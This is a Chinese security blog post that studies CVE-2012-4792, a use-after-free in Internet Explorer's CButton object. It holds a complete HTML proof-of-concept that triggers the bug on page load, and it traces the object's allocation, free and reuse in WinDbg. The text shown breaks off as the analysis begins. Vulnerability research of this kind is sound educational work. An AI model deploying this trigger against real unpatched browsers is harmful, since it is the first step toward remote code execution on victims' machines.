<!DOCTYPE html>

<html>
<head>
<meta charset="utf-8"/>
<title>CVE-2012-4792学习 | o0xmuhe's blog</title>
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
<meta content="前言正好最近在学习 漏洞调试，就找了个 IE 的UAF学习下。
Use-after-free vulnerability in Microsoft Internet Explorer 9 and 10 allows remote attackers to execute arbitrary code via a crafted web site that triggers access to a" name="description"/>
<meta content="article" property="og:type"/>
<meta content="CVE-2012-4792学习" property="og:title"/>
<meta content="http://o0xmuhe.me/2016/10/11/CVE-2012-4792学习/index.html" property="og:url"/>
<meta content="o0xmuhe's blog" property="og:site_name"/>
<meta content="前言正好最近在学习 漏洞调试，就找了个 IE 的UAF学习下。
Use-after-free vulnerability in Microsoft Internet Explorer 9 and 10 allows remote attackers to execute arbitrary code via a crafted web site that triggers access to a" property="og:description"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/POC.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/set_hpa.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/vuln.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/obj_analyse.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/bps.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/CreateElement.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/CButton_obj.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/free_obj.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/heap_free.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/obj_reuse.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/poc_analyse.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/heap_spary.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/size.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/obj_takeup.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/exp_debug.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/exploit_it.png" property="og:image"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/exec_code.png" property="og:image"/>
<meta content="2016-11-07T09:04:32.247Z" property="og:updated_time"/>
<meta content="summary" name="twitter:card"/>
<meta content="CVE-2012-4792学习" name="twitter:title"/>
<meta content="前言正好最近在学习 漏洞调试，就找了个 IE 的UAF学习下。
Use-after-free vulnerability in Microsoft Internet Explorer 9 and 10 allows remote attackers to execute arbitrary code via a crafted web site that triggers access to a" name="twitter:description"/>
<meta content="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/POC.png" name="twitter:image"/>
<link href="./CVE-2012-4792学习  o0xmuhe's blog/atom.xml" rel="alternative" title="o0xmuhe's blog" type="application/atom+xml"/>
<link href="./CVE-2012-4792学习  o0xmuhe's blog/favicon.png" rel="icon"/>
<link href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css" rel="stylesheet"/>
<link href="./CVE-2012-4792学习  o0xmuhe's blog/style.css" rel="stylesheet"/>
<link href="./CVE-2012-4792学习  o0xmuhe's blog/font-awesome.min.css" rel="stylesheet"/>
<link href="./CVE-2012-4792学习  o0xmuhe's blog/apple-touch-icon.png" rel="apple-touch-icon"/>
<link href="./CVE-2012-4792学习  o0xmuhe's blog/jquery.fancybox.css" rel="stylesheet"/>
<!-- 加载特效 -->
<script src="./CVE-2012-4792学习  o0xmuhe's blog/pace.js"></script>
<link href="./CVE-2012-4792学习  o0xmuhe's blog/pace-theme-flash.css" rel="stylesheet">
<script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</link></head>
<body>
<div id="container">
<div class="left-col">
<div class="overlay"></div>
<div class="intrude-less">
<header class="inner" id="header">
<a class="profilepic" href="/">
<img class="js-avatar" lazy-src="./CVE-2012-4792学习  o0xmuhe's blog/head.jpg"/>
</a>
<hgroup>
<h1 class="header-author"><a href="/" title="Hi Mate">muhe</a></h1>
</hgroup>
<p class="header-subtitle">一个有情怀的二进制狗</p>
<div class="switch-btn" id="switch-btn">
<div class="icon">
<div class="icon-ctn">
<div class="icon-wrap icon-house" data-idx="0">
<div class="birdhouse"></div>
<div class="birdhouse_holes"></div>
</div>
<div class="icon-wrap icon-ribbon hide" data-idx="1">
<div class="ribbon"></div>
</div>
<div class="icon-wrap icon-link hide" data-idx="2">
<div class="loopback_l"></div>
<div class="loopback_r"></div>
</div>
<div class="icon-wrap icon-me hide" data-idx="3">
<div class="user"></div>
<div class="shoulder"></div>
</div>
</div>
</div>
<div class="tips-box hide">
<div class="tips-arrow"></div>
<ul class="tips-inner">
<li>菜单</li>
<li>标签</li>
<li>友情链接</li>
<li>关于我</li>
</ul>
</div>
</div>
<div class="switch-area" id="switch-area">
<div class="switch-wrap">
<section class="switch-part switch-part1">
<nav class="header-menu">
<ul>
<li><a href="/">博客首页</a></li>
<li><a href="/archives">所有文章</a></li>
<li><a href="/tags">标签</a></li>
<li><a href="/about">关于我</a></li>
<li><a href="/Pwnable-Log">Pwnable</a></li>
</ul>
</nav>
<nav class="header-nav">
<ul class="social">
<a class="fl github" href="https://github.com/o0xmuhe" target="_blank" title="github">github</a>
<a class="fl weibo" href="http://weibo.com/2070174943/" target="_blank" title="weibo">weibo</a>
<a class="fl twitter" href="https://twitter.com/0xmuhe" target="_blank" title="twitter">twitter</a>
<a class="fl rss" href="/atom.xml" target="_blank" title="rss">rss</a>
</ul>
</nav>
</section>
<section class="switch-part switch-part2">
<div class="widget tagcloud" id="js-tagcloud">
<a href="/tags/C/" style="font-size: 10px;">C</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CTF-Writeup/" style="font-size: 10px;">CTF Writeup</a> <a href="/tags/CVE-analysis/" style="font-size: 10px;">CVE analysis</a> <a href="/tags/LLVM/" style="font-size: 10px;">LLVM</a> <a href="/tags/Linux/" style="font-size: 12px;">Linux</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/angr/" style="font-size: 12px;">angr</a> <a href="/tags/ctf/" style="font-size: 18px;">ctf</a> <a href="/tags/ctf-writeup/" style="font-size: 20px;">ctf writeup</a> <a href="/tags/env-config/" style="font-size: 10px;">env config</a> <a href="/tags/exploit/" style="font-size: 16px;">exploit</a> <a href="/tags/fuzz/" style="font-size: 14px;">fuzz</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/glibc内存管理/" style="font-size: 10px;">glibc内存管理</a> <a href="/tags/life/" style="font-size: 12px;">life</a> <a href="/tags/linux-kernel/" style="font-size: 12px;">linux kernel</a> <a href="/tags/peach/" style="font-size: 10px;">peach</a> <a href="/tags/pwn/" style="font-size: 16px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/ret-2-dl-resolve/" style="font-size: 10px;">ret 2 dl-resolve</a> <a href="/tags/wargame/" style="font-size: 12px;">wargame</a> <a href="/tags/winafl/" style="font-size: 10px;">winafl</a> <a href="/tags/windows-kernel/" style="font-size: 14px;">windows kernel</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a>
</div>
</section>
<section class="switch-part switch-part3">
<div id="js-friends">
<a class="main-nav-link switch-friends-link" href="http://syclover.sinaapp.com/" target="_blank">Syclover Team</a>
<a class="main-nav-link switch-friends-link" href="http://www.Ox9A82.com" target="_blank">0x9A82学弟</a>
<a class="main-nav-link switch-friends-link" href="http://k1n9.me/" target="_blank">K1n9师傅</a>
<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy" target="_blank">L3mon</a>
<a class="main-nav-link switch-friends-link" href="http://www.xianyusec.com" target="_blank">咸鱼</a>
<a class="main-nav-link switch-friends-link" href="http://v1ct0r.com/" target="_blank">V1ct0r</a>
<a class="main-nav-link switch-friends-link" href="http://godot.win" target="_blank">Godot学弟</a>
<a class="main-nav-link switch-friends-link" href="http://hebic.me/" target="_blank">Homaebic学弟</a>
<a class="main-nav-link switch-friends-link" href="https://iqwq.me" target="_blank">两米的sco4x0</a>
<a class="main-nav-link switch-friends-link" href="https://zmy.im/" target="_blank">JimmyZhou</a>
<a class="main-nav-link switch-friends-link" href="http://silic.top/" target="_blank">灭亡叔叔</a>
<a class="main-nav-link switch-friends-link" href="https://dwx.io" target="_blank">Jason</a>
<a class="main-nav-link switch-friends-link" href="	http://www.0aa.me/" target="_blank">Mosuan</a>
<a class="main-nav-link switch-friends-link" href="http://whereisk0shl.top" target="_blank">k0sh1</a>
<a class="main-nav-link switch-friends-link" href="http://winter3un.github.io" target="_blank">WinterSun</a>
<a class="main-nav-link switch-friends-link" href="http://venenof.com" target="_blank">Venenof</a>
<a class="main-nav-link switch-friends-link" href="http://r0p.me/" target="_blank">Icemakr</a>
<a class="main-nav-link switch-friends-link" href="http://bestwing.me/" target="_blank">Swing</a>
<a class="main-nav-link switch-friends-link" href="https://www.hackfun.org/" target="_blank">4ido10n</a>
<a class="main-nav-link switch-friends-link" href="http://www.hackersb.cn/" target="_blank">王松_Striker</a>
<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/7top/" target="_blank">7top</a>
<a class="main-nav-link switch-friends-link" href="http://www.bendawang.site" target="_blank">bendawang</a>
<a class="main-nav-link switch-friends-link" href="http://ctfrank.org" target="_blank">CTF Rank</a>
<a class="main-nav-link switch-friends-link" href="http://askook.me/" target="_blank">A酱</a>
</div>
</section>
<section class="switch-part switch-part4">
<div id="js-aboutme">关注二进制安全. Member of Syclover. CTFer/INTJ.</div>
</section>
</div>
</div>
</header>
</div>
</div>
<div class="mid-col">
<nav id="mobile-nav">
<div class="overlay">
<div class="slider-trigger"></div>
<h1 class="header-author js-mobile-header hide"><a href="/" title="Me">muhe</a></h1>
</div>
<div class="intrude-less">
<header class="inner" id="header">
<a class="profilepic" href="/">
<img class="js-avatar" lazy-src="./CVE-2012-4792学习  o0xmuhe's blog/head.jpg"/>
</a>
<hgroup>
<h1 class="header-author"><a href="/" title="Me">muhe</a></h1>
</hgroup>
<p class="header-subtitle">一个有情怀的二进制狗</p>
<nav class="header-menu">
<ul>
<li><a href="/">博客首页</a></li>
<li><a href="/archives">所有文章</a></li>
<li><a href="/tags">标签</a></li>
<li><a href="/about">关于我</a></li>
<li><a href="/Pwnable-Log">Pwnable</a></li>
<div class="clearfix"></div>
</ul>
</nav>
<nav class="header-nav">
<div class="social">
<a class="github" href="https://github.com/o0xmuhe" target="_blank" title="github">github</a>
<a class="weibo" href="http://weibo.com/2070174943/" target="_blank" title="weibo">weibo</a>
<a class="twitter" href="https://twitter.com/0xmuhe" target="_blank" title="twitter">twitter</a>
<a class="rss" href="/atom.xml" target="_blank" title="rss">rss</a>
</div>
</nav>
</header>
</div>
</nav>
<div class="body-wrap"><article class="article article-type-post" id="post-CVE-2012-4792学习" itemprop="blogPost" itemscope="">
<div class="article-meta">
<a class="article-date" href="/2016/10/11/CVE-2012-4792学习/">
<time datetime="2016-10-11T08:04:17.000Z" itemprop="datePublished">2016-10-11</time>
</a>
</div>
<div class="article-inner">
<input class="isFancy" type="hidden"/>
<header class="article-header">
<h1 class="article-title" itemprop="name">
      CVE-2012-4792学习
    </h1>
</header>
<div class="article-info article-info-post">
<div class="article-tag tagcloud">
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE-analysis/">CVE analysis</a></li></ul>
</div>
<div class="clearfix"></div>
</div>
<div class="article-entry" itemprop="articleBody">
<h4 id="前言"><a class="headerlink" href="#前言" title="前言"></a>前言</h4><pre><code>正好最近在学习 漏洞调试，就找了个 IE 的UAF学习下。
Use-after-free vulnerability in Microsoft Internet Explorer 9 and 10 allows remote attackers to execute arbitrary code via a crafted web site that triggers access to a deleted object, aka "CMarkup Use After Free Vulnerability."
                                                                                     -来自 http://cve.mitre.org/ 
报告指出，微软的 IE9 和 IE10 存在一个 UAF 漏洞，具体是指“CMarkup”对象释放后重 用问题。
</code></pre><hr/>
<a id="more"></a>
<h4 id="测试环境"><a class="headerlink" href="#测试环境" title="测试环境"></a>测试环境</h4><pre><code>windows 7 sp1  xx64 &amp;&amp; 86
IE 8.0.7601.17514 64bit
</code></pre><h4 id="POC-及-漏洞验证"><a class="headerlink" href="#POC-及-漏洞验证" title="POC 及 漏洞验证"></a>POC 及 漏洞验证</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!doctype html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> </span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span></div><div class="line">{</div><div class="line">     <span class="keyword">var</span> e0 = <span class="literal">null</span>;</div><div class="line">     <span class="keyword">var</span> e1 = <span class="literal">null</span>;</div><div class="line">     <span class="keyword">var</span> e2 = <span class="literal">null</span>; </div><div class="line"></div><div class="line">     <span class="keyword">try</span> {</div><div class="line">          e0 = <span class="built_in">document</span>.getElementById(<span class="string">"a"</span>);</div><div class="line">          e1 = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</div><div class="line">          e2 = <span class="built_in">document</span>.createElement(<span class="string">"q"</span>);</div><div class="line"></div><div class="line">          e1.applyElement(e2);</div><div class="line">          e1.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'button'</span>));</div><div class="line">          e1.applyElement(e0);</div><div class="line">          e2.innerHTML = <span class="string">""</span>;</div><div class="line">          e2.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'body'</span>));</div><div class="line">     } <span class="keyword">catch</span>(e) { }</div><div class="line">     CollectGarbage(); </div><div class="line">} </div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"exploit()"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p><img alt="" src="http://blogimg-10065924.cos.myqcloud.com/CVE_2012_4792/POC.png"/></p>
<h4 id="漏洞调试"><a class="headerlink" href="#漏洞调试" title="漏洞调试"></a>漏洞调试</h4><p>首先，设置下 hpa</p>
<pre><code>C:\Program Files (x86)\Windows Kits\8.1\Debuggers\x86&gt;gflags.exe /I iexplore.exe +hpa + ust
</code></pre><p>需要 <code>admin</code> 权限</p>
<p><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/set_hpa.png"/><br/>windbg attach IE 后，IE 打开POC 再次查看<br/><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/vuln.png"/></p>
<p>edi 是一个无效地址，导致崩溃</p>
<pre><code>猜测下，edi指向某个对象，这句应该是取出 这个对象的 虚表指针 ，得到虚表指针之后，
call dword ptr [eax + 0DCh]
调用 0xDC 偏移处的函数
</code></pre><p>利用!heap -p -a edi 分析一下，看看这个对象的操作<br/><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/obj_analyse.png"/><br/>这是全部的内容：<br/><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">005</span>&gt; !heap -p -a edi</div><div class="line">    address <span class="number">0</span>a590fa8 found in</div><div class="line">    _DPH_HEAP_ROOT @ <span class="number">531000</span></div><div class="line">    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)</div><div class="line">                                    a5604e0:          a590000             <span class="number">2000</span></div><div class="line">    <span class="number">748790</span>b2 verifier!AVrfDebugPageHeapFree+<span class="number">0</span>x000000c2</div><div class="line">    <span class="number">776</span>c1464 ntdll!RtlDebugFreeHeap+<span class="number">0</span>x0000002f</div><div class="line">    <span class="number">7767</span>ab3a ntdll!RtlpFreeHeap+<span class="number">0</span>x0000005d</div><div class="line">    <span class="number">77623472</span> ntdll!RtlFreeHeap+<span class="number">0</span>x00000142</div><div class="line">    <span class="number">758</span>c14dd kernel32!HeapFree+<span class="number">0</span>x00000014</div><div class="line">    <span class="number">71</span>bfdc7a mshtml!CButton::`scalar deleting destructor'+<span class="number">0</span>x0000002f</div><div class="line">    <span class="number">71</span>d71daf mshtml!CBase::SubRelease+<span class="number">0</span>x00000022</div><div class="line">    <span class="number">71</span>d6a6b5 mshtml!CElement::PrivateRelease+<span class="number">0</span>x0000002a</div><div class="line">    <span class="number">71</span>d67894 mshtml!PlainRelease+<span class="number">0</span>x00000025</div><div class="line">    <span class="number">71</span>db3862 mshtml!PlainTrackerRelease+<span class="number">0</span>x00000014</div><div class="line">    <span class="number">70</span>f9a735 jscript!VAR::Clear+<span class="number">0</span>x0000005f</div><div class="line">    <span class="number">70</span>fb6e46 jscript!GcContext::Reclaim+<span class="number">0</span>x000000b6</div><div class="line">    <span class="number">70</span>fb43e9 jscript!GcContext::CollectCore+<span class="number">0</span>x00000123</div><div class="line">    <span class="number">710183</span>f0 jscript!JsCollectGarbage+<span class="number">0</span>x0000001d</div><div class="line">    <span class="number">70</span>fa758c jscript!NameTbl::InvokeInternal+<span class="number">0</span>x00000141</div><div class="line">    <span class="number">70</span>fa4f84 jscript!VAR::InvokeByDispID+<span class="number">0</span>x0000017f</div><div class="line">    <span class="number">70</span>fae4c7 jscript!CScriptRuntime::Run+<span class="number">0</span>x00002b80</div><div class="line">    <span class="number">70</span>fa5d7d jscript!ScrFncObj::CallWithFrameOnStack+<span class="number">0</span>x000000ce</div><div class="line">    <span class="number">70</span>fa5cdb jscript!ScrFncObj::Call+<span class="number">0</span>x0000008d</div><div class="line">    <span class="number">70</span>fa5ef1 jscript!CSession::Execute+<span class="number">0</span>x0000015f</div><div class="line">    <span class="number">70</span>f9f4c6 jscript!NameTbl::InvokeDef+<span class="number">0</span>x000001b5</div><div class="line">    <span class="number">70</span>f9eb02 jscript!NameTbl::InvokeEx+<span class="number">0</span>x0000012c</div><div class="line">    <span class="number">70</span>f9a26e jscript!IDispatchExInvokeEx2+<span class="number">0</span>x00000104</div><div class="line">    <span class="number">70</span>f9a1b9 jscript!IDispatchExInvokeEx+<span class="number">0</span>x0000006a</div><div class="line">    <span class="number">70</span>f9f6d0 jscript!NameTbl::InvokeEx+<span class="number">0</span>x0000037a</div><div class="line">    <span class="number">71</span>deddee mshtml!CScriptCollection::InvokeEx+<span class="number">0</span>x0000008a</div><div class="line">    <span class="number">71</span>dec044 mshtml!CWindow::InvokeEx+<span class="number">0</span>x000006ad</div><div class="line">    <span class="number">71</span>d8bc52 mshtml!CBase::VersionedInvokeEx+<span class="number">0</span>x00000020</div><div class="line">    <span class="number">71</span>d8bc0e mshtml!PlainInvokeEx+<span class="number">0</span>x000000eb</div><div class="line">    <span class="number">71</span>dec108 mshtml!COmWindowProxy::InvokeEx+<span class="number">0</span>x00000339</div><div class="line">    <span class="number">71</span>dded17 mshtml!COmWindowProxy::subInvokeEx+<span class="number">0</span>x00000026</div><div class="line">    <span class="number">71</span>d8bc52 mshtml!CBase::VersionedInvokeEx+<span class="number">0</span>x00000020</div></pre></td></tr></table></figure></p>
<p>CButton对象 释放后 重用导致漏洞的发生<br/>那么就要确定三件事：</p>
<h5 id="1-什么时候创建了这个对象"><a class="headerlink" href="#1-什么时候创建了这个对象" title="1.什么时候创建了这个对象"></a>1.什么时候创建了这个对象</h5><h5 id="2-什么时候释放了这个对象"><a class="headerlink" href="#2-什么时候释放了这个对象" title="2.什么时候释放了这个对象"></a>2.什么时候释放了这个对象</h5><h5 id="3-什么时候重用了这个对象"><a class="headerlink" href="#3-什么时候重用了这个对象" title="3.什么时候重用了这个对象"></a>3.什么时候重用了这个对象</h5><p>重新载入 IE 查看 关于这个对象的所有函数</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">013</span>&gt; x mshtml!CButton::*</div><div class="line"><span class="number">71</span>fcf1ee          mshtml!CButton::HandleMessage (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>bd95d8          mshtml!CButton::s_classdescTagButton = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71</span>be67e4          mshtml!CButton::GetAAtype (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>fcf446          mshtml!CButton::GetValueHelper (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>fcf0af          mshtml!CButton::GetEnabled (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>be8ba7          mshtml!CButton::GetThemeState (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>fcf341          mshtml!CButton::get_status (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>bd9601          mshtml!CButton::CreateElement (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>bfca8f          mshtml!CButton::Notify (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>df1ea0          mshtml!CButton::s_StringTable = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71</span>fcf19a          mshtml!CButton::GetFocusShape (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>fcf4cf          mshtml!CButton::SetStatusText (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>fcf2f1          mshtml!CButton::put_status (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>fcf0e2          mshtml!CButton::YieldCurrency (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>dee9b4          mshtml!CButton::GetBtnHelper (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>be8bff          mshtml!CButton::GetBorderInfo (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>fcf2aa          mshtml!CButton::ClickAction (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>fda5c5          mshtml!CButton::createTextRange (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>fcf461          mshtml!CButton::SetValueHelper (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>be6851          mshtml!CButton::GetClassDesc (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>be69ad          mshtml!CButton::ApplyDefaultFormat (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>fcf05a          mshtml!CButton::GetSubmitInfo (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>d68b60          mshtml!CButton::s_apfnpdIHTMLButtonElement = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71</span>dea310          mshtml!CButton::s_acpi = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71</span>dec190          mshtml!CButton::GetNonThemedBorderInfo (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>bfd632          mshtml!CButton::AddCtxInfoToStream (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>df1e90          mshtml!CButton::s_StringTableAggregate = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71</span>be8b74          mshtml!CButton::GetThemeProperties (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>fcf387          mshtml!CButton::GetValue (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>be6870          mshtml!CButton::s_classdescButtonSubmit = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71</span>bd9678          mshtml!CButton::Init2 (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>be6804          mshtml!CButton::s_apHdlDescs = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71</span>be6820          mshtml!CButton::s_ppropdescsInVtblOrderIHTMLButtonElement = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71</span>bfdc4b          mshtml!CButton::`scalar deleting destructor' (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>df1ee0          mshtml!CButton::s_AssocVTablePtr = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71</span>deb5c7          mshtml!CButton::GetElement (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>bb66b8          mshtml!CButton::`vftable' = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71e7</span>d1a0          mshtml!CButton::s_classdescButtonReset = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71</span>d6ecd4          mshtml!CButton::`vftable' = &lt;no <span class="class"><span class="keyword">type</span> <span class="title">information</span></span>&gt;</div><div class="line"><span class="number">71</span>bfdc4b          mshtml!CButton::`vector deleting destructor' (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>bdec4c          mshtml!CButton::SetAAtype (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>bd9702          mshtml!CButton::EnsureDefaultAttributes (&lt;no parameter info&gt;)</div><div class="line"><span class="number">71</span>d06e3e          mshtml!CButton::GetDBindMethods (&lt;no parameter info&gt;)</div></pre></td></tr></table></figure>
<pre><code>71bd9601          mshtml!CButton::CreateElement (&lt;no parameter info&gt;)
凭名字，应该是创建对象的函数
71bfdc4b          mshtml!CButton::`scalar deleting destructor&amp;apos; (&lt;no parameter info&gt;)
这个应该是 删除对象的函数
</code></pre><hr/>
<p>分别对这两个函数下断点后 再次打开POC 调试<br/><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/bps.png"/></p>
<p>首先断在了 CreateElement 函数中<br/><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/CreateElement.png"/></p>
<pre><code>首先为对象 分配了空间
单步分析一波
</code></pre><p><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/CButton_obj.png"/></p>
<pre><code>之后就是对象的释放
</code></pre><p><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/free_obj.png"/></p>
<pre><code>查看下 释放空间的 函数的 参数
</code></pre><p><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/heap_free.png"/></p>
<pre><code>这里执行之后，对象占用的空间就被释放了，再次 g 程序就崩溃在了 对象重用的地方了
</code></pre><p><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/obj_reuse.png"/></p>
<h4 id="分析"><a class="headerlink" href="#分析" title="分析"></a>分析</h4><p>回过头再去看 poc<br/>文件载入的时候，回去调用 exploit() 函数，这个函数 首先创建了三个变量，然后分别赋值操作</p>
